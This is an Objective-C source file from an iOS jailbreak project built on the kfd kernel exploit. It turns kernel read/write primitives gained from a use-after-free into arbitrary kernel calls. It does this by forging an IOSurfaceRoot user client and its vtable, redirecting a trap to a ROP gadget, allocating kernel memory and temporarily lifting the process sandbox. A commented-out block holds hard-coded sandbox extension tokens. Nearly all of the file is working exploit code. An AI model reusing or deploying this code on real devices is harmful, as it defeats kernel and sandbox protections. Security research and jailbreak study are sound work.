//
//  krw.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/10.
//

#import <Foundation/Foundation.h>
#import "krw.h"
#import "libkfd.h"
#import "offsets.h"
#import "sandbox.h"
#import "ipc.h"
#import "KernelRwWrapper.h"

uint64_t IOConnectTrap6(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);

uint64_t _kfd = 0;

uint64_t _self_task = 0;
uint64_t _self_proc = 0;
uint64_t _kslide = 0;
uint64_t _kern_proc = 0;

uint64_t _fake_vtable = 0;
uint64_t _fake_client = 0;
mach_port_t _user_client = 0;

uint64_t get_selftask(void) {
    return _self_task;
}

uint64_t get_selfproc(void) {
    return _self_proc;
}

uint64_t get_kslide(void) {
    return _kslide;
}

uint64_t get_kernproc(void) {
    return _kern_proc;
}

void set_selftask(void) {
    _self_task = ((struct kfd*)_kfd)->info.kernel.current_task;
}

void set_selfproc(void) {
    _self_proc = ((struct kfd*)_kfd)->info.kernel.current_proc;
}

void set_kslide(void) {
    _kslide = ((struct kfd*)_kfd)->info.kernel.kernel_slide;
}

void set_kernproc(void) {
    _kern_proc = ((struct kfd*)_kfd)->info.kernel.kernel_proc;
}



uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
{
//    return 0;
//    NSString *sbToken = @"e41596ddb5c43cd9c0cc9bfac6f018f19390713bd265d69298ac63cb5ef2f6ea;00;00000000;00000000;00000000;000000000000001a;com.apple.app-sandbox.read;01;01000006;00000000000016ae;01;/private/preboot/127DC80EC101C00AD08A5335A1BFB1E021D98F31/jb-8BpYhc/procursus|e598328a7eb88bffd213cda22962d58b93a6f14c88cedc27dd54d52624a83476;00;00000000;00000000;00000000;000000000000001c;com.apple.sandbox.executable;01;01000006;00000000000016ae;01;/private/preboot/127DC80EC101C00AD08A5335A1BFB1E021D98F31/jb-8BpYhc/procursus|cf678ea8900c98e7be870ceb5b95eb0d9d0f67056d562f9e0c17a5c2395b4fb4;01;00000000;00000000;00000000;000000000000001a;com.apple.app-sandbox.mach;kr.h4ck.jailbreakd.systemwide|e2d7e992512ff0740a9309e36542072caa534996fd0550bcc3834061c1ee2227;01;00000000;00000000;00000000;0000000000000034;com.apple.security.exception.mach-lookup.global-name;kr.h4ck.jailbreakd.systemwide";
//    NSArray *components = [sbToken componentsSeparatedByString:@"|"];
//    for(NSString *token in components) {
//        printf("consume ret: %lld\n", sandbox_extension_consume(token.UTF8String));
//    }
//    NSLog(@"dirs: %@", [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/jb" error:nil]);
//
//
//    usleep(1000000);
//    exit(0);
    _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
    
    set_selftask();
    set_selfproc();
    set_kslide();
    set_kernproc();
    
    _offsets_init();
    initKernRw(get_selftask(), kread64, kwrite64);
    printf("isKernRwReady: %d\n", isKernRwReady());
    
    return _kfd;
}

void do_kclose(void)
{
    kclose(_kfd);
}

void do_kread(uint64_t kaddr, void* uaddr, uint64_t size)
{
    kread(_kfd, kaddr, uaddr, size);
}

void do_kwrite(void* uaddr, uint64_t kaddr, uint64_t size)
{
    kwrite(_kfd, uaddr, kaddr, size);
}

uint8_t kread8(uint64_t where) {
    uint8_t out;
    kread(_kfd, where, &out, sizeof(uint8_t));
    return out;
}
uint32_t kread16(uint64_t where) {
    uint16_t out;
    kread(_kfd, where, &out, sizeof(uint16_t));
    return out;
}
uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(_kfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(_kfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(where+1);
    _buf[2] = kread8(where+2);
    _buf[3] = kread8(where+3);
    _buf[4] = kread8(where+4);
    _buf[5] = kread8(where+5);
    _buf[6] = kread8(where+6);
    _buf[7] = kread8(where+7);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kwrite16(uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(where+2);
    _buf[2] = kread16(where+4);
    _buf[3] = kread16(where+6);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kwrite32(uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}
void kwrite64(uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t outputOffset = 0;
    unsigned char* outputBytes = (unsigned char*)output;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t k = kread32(curAddr);

        unsigned char* kb = (unsigned char*)&k;
        for(int i = 0; i < 4; i++)
        {
            if(outputOffset == size) break;
            outputBytes[outputOffset] = kb[i];
            outputOffset++;
        }
        if(outputOffset == size) break;
    }
}

void kwritebuf(uint64_t kaddr, void* input, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t inputOffset = 0;
    unsigned char* inputBytes = (unsigned char*)input;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t toWrite = 0;
        int bc = 4;
        
        uint64_t remainingBytes = endAddr - curAddr;
        if(remainingBytes < 4)
        {
            toWrite = kread32(curAddr);
            bc = (int)remainingBytes;
        }
        
        unsigned char* wb = (unsigned char*)&toWrite;
        for(int i = 0; i < bc; i++)
        {
            wb[i] = inputBytes[inputOffset];
            inputOffset++;
        }

        kwrite32(curAddr, toWrite);
    }
}

uint64_t zm_fix_addr_kalloc(uint64_t addr) {
    //se2 15.0.2 = 0xFFFFFFF00782E718, 6s 15.1 = 0xFFFFFFF0071024B8;
    //XXX guess what is that address xD
    uint64_t kmem = 0xFFFFFFF0071024B8 + get_kslide();
    uint64_t zm_alloc = kread64(kmem);    //idk?
    uint64_t zm_stripped = zm_alloc & 0xffffffff00000000;

    return (zm_stripped | ((addr) & 0xffffffff));
}

//Thanks @Mineek!
uint64_t init_kcall(void) {
    uint64_t add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL){
      printf(" [-] unable to find service\n");
      exit(EXIT_FAILURE);
    }
    _user_client = 0;
    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &_user_client);
    if (err != KERN_SUCCESS){
      printf(" [-] unable to get user client connection\n");
      exit(EXIT_FAILURE);
    }
    uint64_t uc_port = port_name_to_ipc_port(_user_client);
    uint64_t uc_addr = kread64(uc_port + off_ipc_port_ip_kobject);    //#define IPC_PORT_IP_KOBJECT_OFF
    uint64_t uc_vtab = kread64(uc_addr);
    
    if(_fake_vtable == 0) _fake_vtable = off_empty_kdata_page + get_kslide();
    
    for (int i = 0; i < 0x200; i++) {
        kwrite64(_fake_vtable+i*8, kread64(uc_vtab+i*8));
    }
    
    if(_fake_client == 0) _fake_client = off_empty_kdata_page + get_kslide() + 0x1000;
    
    for (int i = 0; i < 0x200; i++) {
        kwrite64(_fake_client+i*8, kread64(uc_addr+i*8));
    }
    kwrite64(_fake_client, _fake_vtable);
    kwrite64(uc_port + off_ipc_port_ip_kobject, _fake_client);
    kwrite64(_fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);

    return 0;
}

uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = kread64(_fake_client+0x40);
    uint64_t offx28 = kread64(_fake_client+0x48);
    kwrite64(_fake_client+0x40, x0);
    kwrite64(_fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(_user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    kwrite64(_fake_client+0x40, offx20);
    kwrite64(_fake_client+0x48, offx28);
    return returnval;
}

uint64_t kalloc(size_t ksize) {
    uint64_t allocated_kmem = kcall(off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0);
    return zm_fix_addr_kalloc(allocated_kmem);
}

void kfree(uint64_t kaddr, size_t ksize) {
    kcall(off_kfree_data_external + get_kslide(), kaddr, ksize, 0, 0, 0, 0, 0);
}

uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
    for(int i = 0; i < size; i+=8) {
        kwrite64(addr + i, 0);
    }
    return 0;
}

int kalloc_using_empty_kdata_page(void) {
    uint64_t add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();

    init_kcall();

    uint64_t allocated_kmem[2] = {0, 0};
    allocated_kmem[0] = kalloc(0x1000);
    allocated_kmem[1] = kalloc(0x1000);

    mach_port_deallocate(mach_task_self(), _user_client);
    _user_client = 0;
    usleep(10000);

    clean_dirty_kalloc(_fake_vtable, 0x1000);
    clean_dirty_kalloc(_fake_client, 0x1000);
    
    _fake_vtable = allocated_kmem[0];
    _fake_client = allocated_kmem[1];

    return 0;
}

int prepare_kcall(void) {
    NSString* save_path = @"/tmp/kfd-arm64.plist";
    if(access(save_path.UTF8String, F_OK) == 0) {
        uint64_t sb = unsandbox(getpid());
        NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:save_path];
        _fake_vtable = [dict[@"kcall_fake_vtable_allocations"] unsignedLongLongValue];
        _fake_client = [dict[@"kcall_fake_client_allocations"] unsignedLongLongValue];
        sandbox(getpid(), sb);
    } else {
        kalloc_using_empty_kdata_page();
        //Once if you successfully get kalloc to use fake_vtable and fake_client,
        //DO NOT use dirty_kalloc again since unstable method.
        uint64_t sb = unsandbox(getpid());
        
        NSDictionary *dictionary = @{
            @"kcall_fake_vtable_allocations": @(_fake_vtable),
            @"kcall_fake_client_allocations": @(_fake_client),
        };
        
        BOOL success = [dictionary writeToFile:save_path atomically:YES];
        if (!success) {
            printf("[-] Failed createPlistAtPath: /tmp/kfd-arm64.plist\n");
            return -1;
        }
        
        sandbox(getpid(), sb);
        printf("Saved fake_vtable, fake_client for kcall.\n");
        printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", _fake_vtable, _fake_client);
    }
    
    init_kcall();
    
    return 0;
}

int term_kcall(void) {
    mach_port_deallocate(mach_task_self(), _user_client);
    _user_client = 0;
    
    return 0;
}
